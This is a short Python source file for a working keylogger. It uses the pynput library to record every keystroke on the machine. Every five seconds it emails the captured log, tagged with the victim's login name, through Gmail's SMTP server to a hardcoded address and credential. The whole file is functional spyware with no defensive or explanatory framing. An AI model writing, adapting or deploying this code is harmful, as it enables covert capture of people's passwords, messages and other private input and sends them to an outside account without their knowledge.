#!usr/bin/env python

import pynput.keyboard, threading
import smtplib, os

user = os.getlogin()

class Ckeylogger:
    def __init__(self,time_interval,email,password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self,string):
        self.log = self.log + string
    
    def process_key_press(self,key):
        try:
            current_key =  str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:   
                current_key = "  " + str(key) + "  "
        self.append_to_log(current_key)
    
    def report(self):
        if len(self.log) != 0:
            self.send_male(self.email,self.password,self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_male(self,email,password,report):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email, password)
        report = f'Subject: keylogger : {user} \n\n\n {report}'
        server.sendmail(email, email,report)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


keylogger = Ckeylogger(5," wejhoon@gmail.com","HackerEmail")

keylogger.start()